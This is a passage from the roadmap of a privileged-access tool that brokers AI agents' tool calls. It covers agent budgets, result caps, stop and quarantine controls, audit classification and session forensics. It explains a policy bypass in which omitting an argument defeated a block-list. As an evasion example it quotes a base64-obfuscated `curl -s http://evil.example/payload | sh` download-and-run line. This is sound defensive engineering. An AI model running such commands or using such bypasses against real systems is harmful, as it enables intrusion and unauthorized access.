  claim, plus the low-level change log, the admin guide, the code guide and the
  shipped policy example

## Phase 168 — v0.47.0 ✅

Releases Phase 167 (cumulative budgets for agents) — a minor: the volume control
a rate limit cannot express. **Schema change** — the migration high-water mark
moves `0043` -> `0044` (an additive nullable column on `agent_keys` plus a
supporting `(actor, action, ts)` index on `audit_events`, applied on startup, no
backfill). One new env var, one new route.

- [x] **v0.47.0** through the test-gated pipeline, rehearsed on `main` first.
  Published 2026-08-18 as `ghcr.io/morandeirachema/pamv1:0.47.0` (also
  `latest`), digest
  `sha256:e5e4e3f942643650b91fdead9d28c02f469248549c714050d62da2286b88e37b`,
  **public** (anonymous pull 200 on both tags, verified via the GHCR anonymous
  token-exchange flow, and both tags resolve to the same digest), with the
  `pam-agent` binaries (amd64 + arm64), the SPDX SBOM and `SHA256SUMS`
  attached. The release workflow's own test job gated the tag and passed first
  time — no runner trouble this round, unlike v0.46.0's SoftHSM hangs
- [x] All five pins via the sweep; Helm chart `version` 0.37.0 -> **0.38.0**
- [x] Both READMEs restated; `docs/README.md`, `docs/NIS2-COMPLIANCE.md` and
  ROADMAP.md's top-banner phase count caught proactively; `CHANGELOG.md` gains
  the release entry, which also records the pgstore `CreateAgentKey` column-drop
  fix that came out of building the phase
- [x] Carries the two dependabot updates merged after v0.46.0 (the Docker base
  image and a Go dependency group), which is what a release phase is for
- [x] The tag is pushed only **after** the release PR is confirmed merged
- [x] Full CI-gate sweep re-verified clean on `main` before tagging:
  `gofmt`, `go vet`, `staticcheck`, `gosec`, `govulncheck`, `go test -race
  ./...`, `go run ./cmd/archgen` (no schema/route drift)

## Phase 167 — Cumulative budgets for agents ✅

**Closes:** the agent-broker research's finding 4 — the only volume control on an
AI agent was an opt-in per-minute rate limit, and `internal/policy` had no
counting operator at all.

**Why a rate limit is not a budget.** `PAM_BROKER_RATE_PER_MIN` bounds bursts and
nothing else: an agent capped at 60 calls a minute may still make **86,400
privileged tool calls a day**, and nobody chose that number — it is what falls
out of the only knob that existed. A budget is the question a rate limit cannot
express: *how much, in total, is this agent allowed to do?*

- [x] **`PAM_BROKER_BUDGET_PER_DAY`** (default 0 = unlimited) caps brokered tool
  calls per agent, with a **per-agent override** on the key
  (`POST /v1/agents/{id}/budget`, `manage_users`). The per-agent value is a
  pointer in the store precisely so three states stay distinguishable: unset
  (inherit the default), `0` (a deliberate hard stop — this agent may make no
  calls at all), and a number. In a plain `int` the first two would be the same
  value, and the difference is between "no limit" and "no calls"
- [x] **A rolling 24-hour window, not a calendar day.** A calendar reset hands
  every agent a predictable instant at which its quota refills — exactly when
  queued work would land — and forces pamv1 to pick a timezone for something
  that has nothing to do with anyone's working day. A rolling window needs no
  reset job, no timezone and no midnight
- [x] **Counted from the audit trail**, not a side counter: `executed` and
  `resumed` calls, both and only. `executed` is work done immediately;
  `resumed` is the agent collecting the result of a call a human approved, which
  is the *other* way work gets done and would otherwise be free. Denials and
  failures deliberately do **not** consume budget — a budget is "how much this
  agent was allowed to DO", and letting refusals burn it would mean a
  misconfigured agent exhausts its own quota and then a legitimate call is
  refused for the wrong reason. The rate limit is what bounds refusal storms.
  Counting from the trail also means the number an operator sees and the number
  the gate enforces cannot drift apart
- [x] **Bounds new work only.** The check sits on the tool-call path, not in
  `agentAuth`: refusing to hand over the result of a call a human already
  approved would hide the output while keeping the side effect — the same trap
  Phase 165's result cap avoids by truncating rather than failing
- [x] **Enforced on both transports.** REST and MCP share one decision function;
  a limit only one transport honours is not a limit, and MCP is the one an agent
  framework actually speaks
- [x] **Fails closed.** A counting failure refuses the call. That reads harsh for
  a resource control until you notice what the count is read FROM: if the audit
  trail cannot be read, the call could not have been recorded either, and the
  broker already refuses to execute what it cannot audit — so failing closed
  costs nothing that was not already lost, and "just this once, unmeasured" is
  precisely what a budget exists to prevent
- [x] **Visible before it bites.** `GET /v1/agents` reports `budget_used_today`
  and the effective limit per agent, and console menu 26 shows usage against the
  limit, so an operator can see who is close to their ceiling rather than
  learning about it from a refused call. Exhaustion is audited under its own
  action (`agent.budget_exhausted`) — as often the signal that a budget is set
  too low as that an agent is running away
- [x] **Honest limitation:** a SPIFFE/SVID-authenticated agent has no key row and
  so inherits the server default with no per-agent override. Stated in the code
  and the threat model rather than hidden; the fix is per-identity budgets keyed
  on the SPIFFE ID, the shape Phase 159's quarantine already uses to cover both
  identity kinds
- [x] Migration `0044` (additive); one new env var; one new route

## Phase 166 — v0.46.0 ✅

Releases Phase 165 (bounded results + the `.ssh.log` transcript) — a minor that
closes a **memory-exhaustion vector against the pamv1 host itself**, reachable
through an ordinary policy-allowed tool call, and bounds how much data an AI
agent can pull through the broker. No schema change (high-water mark stays
`0043`); one new env var, `PAM_BROKER_MAX_RESULT_BYTES`.

- [x] **v0.46.0** through the test-gated pipeline, rehearsed on `main` first.
  Published 2026-08-18 as `ghcr.io/morandeirachema/pamv1:0.46.0` (also
  `latest`), digest
  `sha256:f43d072b6539759619d78380a2a95e485e58f368ca99f5bf8457a5bd484569d3`,
  **public** (anonymous pull 200 on both tags, verified via the GHCR anonymous
  token-exchange flow), with the `pam-agent` binaries, the SPDX SBOM and
  `SHA256SUMS` attached. CI's SoftHSM job hung on its `apt-get install` step
  twice during this phase (once for ~28 minutes before being cancelled), which
  is a GitHub runner problem, not a build one — noted here because the same
  symptom will look alarming next time
- [x] All five pins via the sweep; Helm chart `version` 0.36.0 -> **0.37.0**
- [x] Both READMEs restated; `docs/README.md`, `docs/NIS2-COMPLIANCE.md` (whose
  own "Reflects" header is re-synced again) and ROADMAP.md's top-banner phase
  count caught proactively; `CHANGELOG.md` gains the release entry, leading with
  *Fixed* because the headline is a defect, not a feature
- [x] The tag is pushed only **after** the release PR is confirmed merged
- [x] Full CI-gate sweep re-verified clean on `main` before tagging:
  `gofmt`, `go vet`, `staticcheck`, `gosec`, `govulncheck`, `go test -race
  ./...`, `go run ./cmd/archgen` (no schema/route drift)

## Phase 165 — Bounded results, and the transcript that makes bounding safe ✅

**Closes:** the agent-broker research's finding 6 — arguments capped since Phase
13, results never; and no durable record of what a brokered command returned.
Building it turned up a third thing neither the research nor the plan named: the
SSH exec primitive read remote output with **no bound at all**.

**Three defects, one shape — nobody decided how much data an agent could pull.**

- [x] **SSH exec output is bounded at the source.** `rotate.SSHConnector.Exec`
  used `sess.CombinedOutput`, which grows a buffer until the remote command
  stops. That is the primitive behind `ssh_exec`, account discovery, rotation
  verification and the post-session forensics pull — so `cat /var/log/huge`
  through a policy-allowed tool call was a memory-exhaustion vector against the
  PAM host itself. Now capped at 4 MiB, mirroring the WinRM twin that has had
  exactly that cap since Phase 13, with the truncation **visible in the output**
  and reported as `ExecResult.Truncated`. The asymmetry was the tell: Phase 157's
  forensics command worked around the missing cap in the command string itself
  (`| tail -c 1048576`), which protected only the caller that thought of it
- [x] **A tool's result is capped before it reaches the agent**
  (`PAM_BROKER_MAX_RESULT_BYTES`, default 64 KiB). Truncated, never refused —
  by the time a result exists the command has ALREADY RUN, so failing the call
  would hide the output while keeping the side effect. The agent gets a bounded
  slice, is told so both in the text and as `truncated: true`, and the shortening
  is deterministic (Go randomises map iteration; two identical calls that return
  differently are impossible to reason about in an audit trail)
- [x] **A secret-bearing result is never truncated.** A secret cut in half is not
  a smaller secret, it is a broken one, and an agent that pastes it into a login
  gets a failure it cannot diagnose
- [x] **`ssh_exec` writes a durable transcript** (`.ssh.log`), the last member of
  the brokered-command family without one: WinRM has had `.winrm.log` since
  Phase 13, Kubernetes `.k8s.log` since 155, the forensic reconstruction
  `.forensics.log` since 157, and a human's SSH session an asciicast since Phase
  2. The single path where an AI agent runs a command on a Linux host was the one
  place the output existed only in the agent's own context. **This is what makes
  capping acceptable** — the agent's copy may be a slice, but nothing is lost
- [x] The new suffix is registered in the recordings listing regex **and** the
  classifier, not just the writer — the pair Phase 155 got half of. The test now
  pins every suffix in the family at once
- [x] **Three callers now react to a truncated read**, rather than only being
  protected by it. Account discovery reports `partial: true` (a truncated
  `/etc/passwd` parses cleanly and simply lists fewer accounts — an unmanaged,
  possibly privileged account would go unreported while the scan looked like a
  clean bill of health); the forensic reconstruction marks the artifact
  truncated; and `ssh_exec` sets a structural `truncated` field rather than
  leaving an agent to substring-match a marker that travels inside output the
  **remote host controls**
- [x] No schema change, no route change. One new env var

## Phase 164 — v0.45.0 ✅

Releases Phase 163 (policy that cannot be bypassed by omission) — a minor that
closes a **real authorization bypass**, not a hardening nicety: a `not_in`
block-list over an optional argument admitted the exact call it existed to stop.
No schema change (migration high-water mark stays `0043`).

Like v0.44.0 it carries operator-visible changes, and for the same reason they
go in the CHANGELOG's *Changed* section rather than *Added*: **policy semantics
change** (every condition operator now requires the argument to be present), and
tool calls with undeclared, missing, mistyped or empty-string arguments now come
back `failed` where they previously ran with the value silently defaulted.

- [x] **v0.45.0** through the test-gated pipeline, rehearsed on `main` first.
  Published 2026-08-18 as `ghcr.io/morandeirachema/pamv1:0.45.0` (also
  `latest`), digest
  `sha256:18334e910e5e321102e906e35d90cce7fddba310c2497319c9e27d50564e729e`,
  **public** (anonymous pull 200 on both tags, verified via the GHCR anonymous
  token-exchange flow), with the `pam-agent` binaries, the SPDX SBOM and
  `SHA256SUMS` attached
- [x] All five pins via the sweep; Helm chart `version` 0.35.0 -> **0.36.0**
  (minor, alongside the `appVersion` minor)
- [x] Both READMEs restated (Phase 163's own PR landed the parity-table row —
  this pass covers every scattered version/phase-count mention), and every
  release-date mention moved to 2026-08-18
- [x] `docs/README.md`'s currency line, `docs/NIS2-COMPLIANCE.md`'s
  compliance-evidence row (whose own "Reflects" header had drifted to 0–159) and
  ROADMAP.md's top-banner phase count all caught proactively; `CHANGELOG.md`
  gains the release entry
- [x] The tag is pushed only **after** the release PR is confirmed merged (the
  v0.43.0 lesson: a merge that 503s while the tag push succeeds puts the tag on
  the wrong commit)
- [x] Full CI-gate sweep re-verified clean on `main` before tagging:
  `gofmt`, `go vet`, `staticcheck`, `gosec`, `govulncheck`, `go test -race
  ./...`, `go run ./cmd/archgen` (no schema/route drift)

## Phase 163 — Policy that cannot be bypassed by omission ✅

**Closes:** the agent-broker research's finding 8 — negative policy guards
bypassed by omission, no argument validation against the declared schema, and no
`required` in the emitted JSON Schema — plus the cheap `isError` fix from the
same pass.

**The defect, and why it is the worst shape a control can have.** A `Condition`
using `not` or `not_in` was satisfied when the argument was **absent**
(documented as "differs or absent", so it looked deliberate). The exploit is
concrete, not theoretical: `list_credentials` takes an OPTIONAL `target` and
lists **every** credential's metadata when it is omitted. So the guard an
operator would naturally write —

```yaml
- id: not-the-vault
  tool: list_credentials
  effect: allow
  when: { args.target: { not_in: [vault-prod, hsm-root] } }
```

— did the opposite of what it says: omitting `target` satisfied the block-list,
matched the allow rule, and listed the two targets the rule names. **The rule
reads as a restriction and is defeated by sending less data.**

- [x] **Every operator now requires the argument to be present**, matching `eq`,
  `in` and the numeric comparators, which always did. An omitted argument
  matches no condition, so the call falls through to the implicit deny
- [x] **New `present: true|false` operator**, because after that change there was
  no way to express "absent is acceptable" or "this argument must NOT be
  supplied" — and the engine has no OR. `present: false` is how an operator
  writes "the unscoped, list-everything form of this call is not allowed", which
  is the very bypass the phase closes. The example policy gained exactly that
  rule
- [x] **Arguments are validated against the tool's own declared schema** before
  the policy engine sees them (`broker.ValidateArgs`): an argument the tool does
  not declare is **refused, not ignored** (the engine only inspects fields a rule
  names, so an undeclared argument is a value that passed no guard — and a typo
  like `targt` silently became "not supplied", which for an optional filter is
  the difference between listing one thing and listing everything); a missing
  required argument is refused (the tools read arguments with Go's comma-ok
  assertion, so a missing string quietly became `""`); and a wrong type is
  refused, which matters because the engine compares a **stringified** value
  while the tool reads the raw JSON one — a type the two disagree about is a
  value a rule can be made to match while the tool does something else with it
- [x] **The `InputSchema` shorthand gained an optional marker** (`"string?"`), so
  required-ness is declared rather than guessed. `list_credentials`' `target` is
  the only optional argument in the toolset, and the marker exists for it
- [x] **A supplied-but-empty string is refused** — the same bypass wearing one
  character. `target: ""` is *present* as far as policy is concerned, so it
  satisfies both a `not_in` block-list and a `present: true` guard, while the
  tool reads it as "no filter" and returns everything. Found by the subagent
  building the policy half and reported rather than silently patched, which is
  the boundary working as intended
- [x] **`required` is now advertised** in the MCP `tools/list` JSON Schema
  (sorted, and omitted entirely rather than emitted empty), so a well-behaved
  client gets the call right instead of learning the contract from a refusal
- [x] **An MCP denial is flagged `isError: true`.** It was `false`, so a client
  that trusts the flag — which is what the flag is for — read a policy refusal as
  a successful call that returned some text. A call parked for approval is
  deliberately still not an error: it has not failed, it is waiting for a human
- [x] Ordering preserved deliberately: an **unknown tool** has no schema to check
  against and still falls through to the policy decision, so "unknown tool with
  no matching rule" stays a DENIAL rather than becoming a validation failure
- [x] No schema change, no new env var, no route change. **Policy semantics DO
  change** — the CHANGELOG and the admin guide both say so plainly rather than
  burying it

## Phase 162 — v0.44.0 ✅

Releases Phase 161 (agent run visibility) — a minor: agent behaviour becomes
visible to both detection surfaces and an agent run becomes reconstructible. No
schema change (migration high-water mark stays `0043`). Unlike most releases in
this project, it carries **two changes an operator must read before upgrading**:
`broker.tool_call` is no longer written (the action now carries the outcome), and
dotted `.failed`/`.denied` actions now export as OCSF Detection Finding 2004
instead of API Activity 6003. Both are in the CHANGELOG's *Changed* section
rather than buried in *Added*, which is what that section is for.

- [x] **v0.44.0** through the test-gated pipeline, rehearsed on `main` first.
  Published 2026-08-17 as `ghcr.io/morandeirachema/pamv1:0.44.0` (also
  `latest`), digest
  `sha256:bf9cd8c0ceead7dd71f2fb6bc5abe4e7f065281e67d70777a1e55158b39505b0`,
  **public** (anonymous pull 200 on both tags, verified via the GHCR anonymous
  token-exchange flow), with the `pam-agent` binaries, the SPDX SBOM and
  `SHA256SUMS` attached. GitHub's API was 503-ing throughout this release: the
  CI fuzz smoke and the `Create GitHub Release` step each needed one re-run,
  neither for a defect in the build
- [x] All five pins via the sweep; Helm chart `version` 0.34.0 -> **0.35.0**
  (minor, alongside the `appVersion` minor)
- [x] Both READMEs restated (Phase 161's own PR landed the parity-table row —
  this pass covers every scattered version/phase-count mention)
- [x] `docs/README.md`'s currency line, `docs/NIS2-COMPLIANCE.md`'s
  compliance-evidence row and ROADMAP.md's top-banner phase count all caught
  proactively; `CHANGELOG.md` gains the release entry
- [x] The tag is pushed only **after** the release PR is confirmed merged, not
  chained to the merge command — v0.43.0's tag landed on the wrong commit when
  GitHub 503'd the merge while the tag push succeeded, and had to be deleted,
  its premature release run cancelled, and re-cut
- [x] Full CI-gate sweep re-verified clean on `main` before tagging:
  `gofmt`, `go vet`, `staticcheck`, `gosec`, `govulncheck`, `go test -race
  ./...`, `go run ./cmd/archgen` (no schema/route drift)

## Phase 161 — Agent run visibility (detection parity + run correlation) ✅

**Closes:** the agent-broker research's findings 3 and 5 — the two that separate
passes reached independently after Phase 159's pair. Both are about what the
broker *writes*, not what it allows, and they compounded: an agent's behaviour
was invisible to both of pamv1's detection surfaces at once, and no investigator
could reassemble a single agent run out of the trail.

**The defect, in two halves.** Every brokered tool call — executed, denied,
parked — was written to the primary audit trail as one action, `broker.tool_call`,
with the outcome buried in the detail text. Both consumers of that trail key on
the action name, so both were blind. `internal/ocsf` classified
`broker.tool_call.denied` as a Detection Finding, but that name was only ever
written to the hash chain, which the OCSF exporter does not read — the
classification had **never once fired** since Phase 27, which is precisely the
failure mode that file's own header warns about twice from earlier incidents.
And `internal/analytics`, the behavioural risk engine, had **no agent action in
any signal map at all**: an agent could execute privileged calls at any rate, at
any hour, against hosts it had never touched, and score exactly zero. Meanwhile
`broker.Call.SessionID` had been accepted by the API since Phase 13 and written
**nowhere**.

- [x] **Outcome-bearing actions.** The primary trail records
  `broker.tool_call.{requested,executed,denied,pending_approval,failed,resumed,withdrawn}`,
  spelled once as exported `broker.ActionToolCall*` constants plus
  `broker.ActionFor(Status)` — so the two trails and the SIEM classifier cannot
  drift, and the literals are greppable, which is what the new guard test needs
- [x] **Analytics covers agents.** `broker.tool_call.executed` counts as
  `activity`, so velocity, peer-outlier and new-target novelty all reach agents;
  `broker.tool_call.denied`, `broker.approval.refused` and Phase 159's
  `agent.quarantine_refused` count as `command_blocked` — the signal class
  permitted to drive an **automated response**, unlike `auth_failure`, which is
  deliberately excluded because an unauthenticated party can pin it on a
  victim's name
- [x] **One deliberate exemption.** A new `offHoursExempt` predicate keeps the
  `broker.` family out of the off-hours signal: an AI agent working at 03:00 is
  normal operation, and scoring it would mark every agent permanently and near
  the per-signal cap — a detector that fires on every member of a class every
  day is one operators learn to scroll past. Activity yes, off-hours no
- [x] **A regression the phase nearly shipped, caught in review.** Adding agents
  to `activityActions` also added them to the peer-outlier comparison pool, and
  agents are high-volume by nature — ten agents at ~100 calls each beside five
  humans at ~5 sessions raises the median 20×, hiding a human doing ten times
  their normal work. The comparison is now **per class** (agents vs agents,
  humans vs humans), each pool keeping its own `PeerMinActors` guard so a class
  too small falls silent rather than being compared against an unrelated
  population; an actor counts as an agent only if their activity is *entirely*
  brokered. Pinned by `analytics.TestPeerOutlierComparesLikeWithLike`, confirmed
  to fail against the intermediate code first
- [x] **A systemic classifier bug found on the way.** `isFinding`'s suffix rules
  matched `_denied`/`_failed` but not the dotted forms, so `agent.disable.failed`
  (Phase 159) was exporting as routine API Activity. Both separators now match —
  pamv1's vocabulary genuinely uses both shapes — and dotted failures export as
  Detection Finding 2004 instead of API Activity 6003. **Wire-format change**,
  recorded in the low-level doc
- [x] **The bug class is now guarded.** `ocsf.TestFindingExactActionsAreEmittable`
  walks `internal/` + `cmd/` and fails on any classified action no code can emit.
  Verified to bite by re-inserting the historical `proxy.auth_rate_limited`
- [x] **A run can be reconstructed.** `session:` (the agent's declared run id),
  `client:` (its declared software/model — over MCP both come from the protocol
  session and `initialize`'s `clientInfo`) and `target:` reach the trail, each
  caller-supplied value quoted and bounded through `auditfmt.Field`. They are
  provenance, recorded and **never consulted for a decision**; the phase's test
  fires a run id of `r1 actor:admin status:executed` at it and proves it survives
  only inside one quoted token
- [x] **The chain now records collection.** `Broker.Resume` takes the collecting
  identity and appends `broker.tool_call.resumed` to the hash chain with the
  token's `jti`. Until now the authoritative record ended at the human's approval
  decision — the moment the agent actually **took** the result, which for
  `reveal_credential` is the moment a secret left pamv1, appeared only in the
  primary trail
- [x] No schema change, no new env var, no route change. `Outcome` gained
  `session_id` and `tool` (echoed back so an async caller can correlate its own
  concurrent calls) and an unexported `jti` that is never serialised to the agent
- [x] Built with two parallel file-disjoint subagents (analytics, OCSF) to a
  fixed contract, with the broker/API half, git, the gates, the docs and the
  release kept in the main session. The flagship test was verified to **fail**
  with the rename reverted, not merely to pass with it present

## Phase 160 — v0.43.0 ✅

Releases Phase 159 (agent identity lifecycle and the stop button) — a minor:
one new capability, and the first release driven by gap research aimed at
pamv1's **own AI-agent broker** rather than at its human-operator paths.
**Schema change** — the migration high-water mark moves `0042` -> `0043`
(additive columns plus one new table, applied on startup, no backfill).

- [x] **v0.43.0** through the test-gated pipeline, rehearsed on `main` first.
  Published 2026-08-17 as `ghcr.io/morandeirachema/pamv1:0.43.0` (also
  `latest`), digest
  `sha256:2d78018a4bbe18ec7c73eb5843b3dfd57af62962f5c69f013afba7a525246c83`,
  **public** (anonymous pull 200, verified via the GHCR anonymous
  token-exchange flow), with the `pam-agent` binaries attached as since
  v0.40.0
- [x] All five pins via the sweep; Helm chart `version` 0.33.0 -> **0.34.0**
  (minor, alongside the `appVersion` minor)
- [x] Both READMEs restated (Phase 159's own PR landed the parity-table row —
  this pass covers every scattered version/phase-count mention)
- [x] `docs/README.md`'s currency line, `docs/NIS2-COMPLIANCE.md`'s
  compliance-evidence row and ROADMAP.md's top-banner phase count all caught
  proactively; `CHANGELOG.md` gains the release entry
- [x] **CHANGELOG link-reference block repaired** — it had stopped being
  extended after `v0.22.0`, so twenty version headings (`0.23.0`–`0.42.0`)
  rendered as unresolved references and `[Unreleased]` still compared against
  `v0.22.0`. Backfilled in full and pointed at `v0.43.0`; a release phase is
  the right place to notice a release-notes defect
- [x] Full CI-gate sweep re-verified clean on `main` before tagging:
  `gofmt`, `go vet`, `staticcheck`, `gosec`, `govulncheck`, `go test -race
  ./...`, `go run ./cmd/archgen` (no schema/route drift)

## Phase 159 — Agent identity lifecycle and the stop button ✅

**Opens a new batch** — the first gap research ever aimed at pamv1's own
**AI-agent access broker** (Phases 13/27/57), commissioned the moment the
129–158 batch closed. Four parallel read-only passes, same methodology as the
vendor rounds (read `docs/AGENT-THREAT-MODEL.md`, the broker's own roadmap
phases and `EXTERNAL-INFRA-GAPS.md` FIRST so nothing shipped or already-deferred
comes back as a finding; primary sources only; verify every candidate against
real code with `file:line` before reporting it): **MCP specification security**,
**agent-identity and delegation standards**, **what PAM vendors now ship for AI
agents**, and **agentic-AI threat frameworks**. The sharpest claims were then
re-verified by hand before anything was built.

This phase closes the **two findings that separate passes reached
independently** — the strongest signal this project's research method produces.

**Finding 1: you cannot stop an agent.** `store.AgentKey.Disabled` is honoured
on read in both backends — and **no code path could ever set it**. Create
hardcodes `false`, there is no update method, and the only lever was `DELETE`,
which destroys the row an incident responder wants and silently invalidates
whatever that agent had parked awaiting approval. A dead field that reads like a
control is worse than an absent one. Worse still, `revalidateAgent` gated its
store check on `id.KeyID > 0`, and an SVID identity carries `KeyID == 0` — so in
the **intended production posture** (SPIFFE) there was no local containment at
all: the answer to "an agent is misbehaving, stop it" was "wait for the SVID to
expire". Found by the vendor pass (BeyondTrust's suspend-the-agent-identity,
Aembit's pausable-mid-workflow) and the framework pass (EU AI Act Art. 14(4)(e)
"stop button", CSA's agentic IAM lifecycle).

**Finding 2: agent identities had no lifecycle** — no expiry, no last-used, no
offboarding cascade. The least-trusted actor class in the system held an
**immortal standing bearer credential** that nothing reviewed and nothing could
age out, while humans get certification campaigns, checkout leases and
revocation. The internal contrast settled it: Phase 153's `EndpointAgent` — the
*newest* non-human identity here — already carries `LastSeen` and `RevokedAt`;
the oldest one was the weakest. Confirmed by three vendors independently
(CyberArk's create-to-decommission lifecycle, Microsoft Entra Agent ID
governance with access reviews and a responsible person, Teleport's short-lived
credentials) and, separately, by OWASP's NHI Top 10 "improper offboarding".

**What shipped.**

- **Suspend/resume, not just destroy**: `POST /v1/agents/{id}/disable` and
  `/enable` make `Disabled` reachable at last — reversible, audited
  (`agent.disable`/`agent.enable`), and effective both at the front door and at
  approval time for already-parked calls. `DELETE` remains for when you mean it.
  This mirrors what pamv1 already does for vendors (`SetVendorDisabled`) and for
  SCIM users (soft-delete, Phase 149); agents were the outlier.
- **Quarantine, keyed on the canonical subject**, which is the design decision
  that makes one list cover **both** identity kinds: a static key's subject is
  its agent name, and an SVID agent's `Identity.AgentName` **is** its SPIFFE ID
  (`internal/agentid/svid.go`), so `agent_quarantine.subject` reaches the
  identity kind that has no row to disable. Checked in `agentAuth` and again in
  `revalidateAgent`; a store error **fails closed**, because a stop button that
  stops working when the database hiccups is not a stop button.
- **Expiry** (`expires_in_days` at creation, absent/0 = never, so every existing
  key is unaffected), enforced in `StaticVerifier.Verify` *and* surfaced as
  `Identity.ExpiresAt` — which means the expiry logic that already existed for
  SVIDs now covers static keys for free, including the parked-call re-validation.
- **Last-used**, recorded best-effort on every successful authentication and
  never allowed to block or fail one, so "is anyone still using this key?" — the
  question a PAM must always be able to answer about a standing credential — has
  an answer.
- **Offboarding cascade**: deleting a human suspends every agent key they owned
  (`agent.disable … reason:owner-offboarded`). Suspend, not delete: the
  accountable human is gone, so the agent must stop — but the record must not.
- New migration `0043`; `BrokerStore` gains seven methods (store surface 196 →
  **203**); console menu 26 gains status/expiry/last-used columns, `5=Suspend`,
  `6=Resume` and `F7` for the quarantine list.

**Built with three parallel subagents to a fixed interface contract** — store
layer, auth+API layer, console — each confined to a disjoint file set, with git,
the gates, the docs and the release kept in the main session (the boundary this
project learned to state explicitly after a docs-only subagent once opened its
own PR).

## Phase 158 — v0.42.0 ✅

Releases Phase 157 (post-session forensic reconstruction) — a genuine minor:
one new capability plus the recordings-listing fix that phase turned up. No
schema change (migration high-water mark stays `0042`). **This release closes
the 15-phase BeyondTrust/Delinea/Teleport/StrongDM batch (129–158)**: every
item in that plan is now shipped, cut down with a documented reason, or
recorded as a permanent limitation.

- [x] **v0.42.0** through the test-gated pipeline, rehearsed on `main` first.
  Published 2026-08-17 as `ghcr.io/morandeirachema/pamv1:0.42.0` (also
  `latest`), digest
  `sha256:0562b828f585840047cb6d19c9a336a166e000cf537af3f8065afe543f785cd0`,
  **public** (anonymous pull 200, verified via the GHCR anonymous
  token-exchange flow), with the `pam-agent` binaries attached as in
  v0.40.0/v0.41.0
- [x] All five pins via the sweep; Helm chart `version` 0.32.0 -> **0.33.0**
  (minor, alongside the `appVersion` minor)
- [x] Both READMEs restated (the Tier-6 parity table row already landed in
  Phase 157's own PR — this pass covers every scattered version/phase-count
  mention)
- [x] `docs/README.md`'s currency line, `docs/NIS2-COMPLIANCE.md`'s
  compliance-evidence row and ROADMAP.md's top-banner phase count all
  caught proactively; `CHANGELOG.md` gains the release entry
- [x] Full CI-gate sweep re-verified clean on `main` before tagging:
  `gofmt`, `go vet`, `staticcheck`, `gosec`, `govulncheck`, `go test -race
  ./...`, `go run ./cmd/archgen` (no schema/route drift)

## Phase 157 — Post-session forensic reconstruction (the eBPF finding) ✅

**Closes:** Teleport's Enhanced Session Recording — "audit-only forensic
reconstruction of what actually ran inside a PTY, defeating base64-obfuscated
and disabled-echo evasion after the fact" — the batch's last item, and the one
whose *planned mechanism* did not survive contact with pamv1's architecture.
The stated outcome is delivered; the stated mechanism is documented as
permanently unavailable to a proxy, with the evidence for that claim.

**The go/no-go, done first, exactly as Phase 129 did for RDP.** The plan called
for eBPF (`cilium/ebpf`, Linux 5.8+, a CAP_BPF CI runner). Two findings, in
order of severity:

1. **Architectural, and decisive: an eBPF exec tracer on the pam-server host
   would observe *zero* events for every brokered session.** pamv1 is a proxy —
   an operator's shell runs on the TARGET, under the target's own sshd, in the
   target's kernel. Verified rather than assumed: there is no `os/exec` anywhere
   in this repo's production code (`grep -rl '"os/exec"'` hits two test files
   and nothing else), the SSH proxy bridges channels to the target's sshd,
   WinRM/Kubernetes run remotely, and the database proxies relay wire
   protocols. Teleport's mechanism works because its SSH service *is* the sshd
   on the node, so a session's processes are its own children. pamv1 has no such
   foothold — with one narrow exception: the Phase 153 endpoint agent runs ON a
   target, but only on opt-in endpoints, and even there kernel tracing would
   need system-wide probes plus a socket → sshd-child → process-tree
   correlation, plus a reporting path from agent to server that Phase 153
   deliberately refused to open ("an agent may open NO channels toward pamv1").
   That is a **permanent limitation of brokering**, not a gap a bigger CI runner
   closes.
2. **Environmental, and secondary:** this environment cannot load BPF at all —
   `CapEff` is `0000000000000000`, `kernel.unprivileged_bpf_disabled=2`,
   tracefs is unreadable, `perf_event_paranoid=4`, and there is no clang. Even
   a blind, CI-only build could not be verified locally. On its own this would
   have been an infrastructure gap; combined with (1) it is moot.

**So the phase ships the honestly-buildable v1 of the same outcome** — the same
move Phase 133 made when true TPM attestation turned out to need a client-side
key-custody story that does not exist ("a materially different, honestly-
buildable v1"), and Phase 143 made when whole-file ICAP scanning turned out to
be detection rather than prevention. **Post-session forensic reconstruction:**
when an interactive SSH session ends, pamv1 runs ONE fixed, read-only command
over that target's own vaulted credential, on a FRESH connection (never the
live session — Phase 128's established shape), pulls the TARGET's own kernel
audit records, filters them to that session's window, and stores the result
beside the recording as a hash-chained, audited artifact.

**Why the target's audit subsystem is the right source.** It is fed by the same
syscall hooks an eBPF probe would tap, it is already running on most hardened
Linux fleets, and — the point of the whole phase — it records the argv **as
executed**: an operator who types `echo Y3VybCA… | base64 -d | sh` leaves an
innocuous line in the recording, while the kernel logs the decoded
`curl -s http://evil.example/payload | sh` that actually ran. `stty -echo`
hides the typing entirely and changes nothing about what the kernel saw.

**Design decisions:**

- **New leaf `internal/sessionforensics`** — pure parsing, no I/O, testable
  against fixed sample text exactly like `internal/accountscan`. It handles all
  three ways auditd encodes an argument: quoted, **hex** (used whenever an
  argument contains a space or quote — decoding it is not cosmetic, it is
  precisely where an obfuscated command line lives), and the **chunked**
  `aN_len`/`aN[i]` form a long payload is split into (concatenated in index
  order — the wrong order would silently corrupt evidence).
- **The command is fixed and read-only**, not configurable: a remote command
  string an operator could set is a policy hole, and this one runs with a
  privileged vaulted credential. `ausearch -m EXECVE -ts today | tail -c
  1048576` — `ausearch` because it follows log rotation; `-ts today` rather
  than an exact window because ausearch's `-ts` takes a locale-formatted date
  and building one on the target's locale is how a forensic tool starts lying,
  so **the window is applied here** against each record's own epoch timestamp;
  `tail -c` because a chatty target must not be able to flood the artifact.
  stderr is deliberately NOT redirected away — the target's own "Permission
  denied" is what turns an empty result into an honest UNAVAILABLE note. A test
  pins that the literal stays read-only (no redirection, no `sudo`, no `;`).
- **"Unavailable" is a finding, not silence.** A target with no auditd, exec
  auditing off, or a credential that may not read the audit log produces
  `session.forensics_unavailable` with the reason, and an artifact that says
  UNAVAILABLE in as many words. "Nothing was recorded" and "nothing ran" must
  never look the same — which is also why the artifact is written even for that
  case.
- **The window scopes the artifact to ONE session.** A target's audit log holds
  every session's execs, including other operators'; bleeding a neighbour's
  commands into this record would be worse than reporting nothing. Pinned by a
  test with an out-of-window exec that must not appear.
- **It only fires for sessions that ran something.** A connection that is
  admitted and then closed without opening a session channel executed nothing,
  so reconstructing it would be noise — and would run an extra command on the
  target for no reason.
- **A Zero Standing Privilege credential is refused, loudly.** Its session
  certificate was minted for that session and is gone; minting a second one
  here would be a fresh privileged access AFTER the session's approval was
  consumed. That is an audited `session.forensics_unavailable`, not a quiet
  widening of what a ZSP credential authorizes.
- **pamv1's own literal is not exempt from policy**: the command goes through
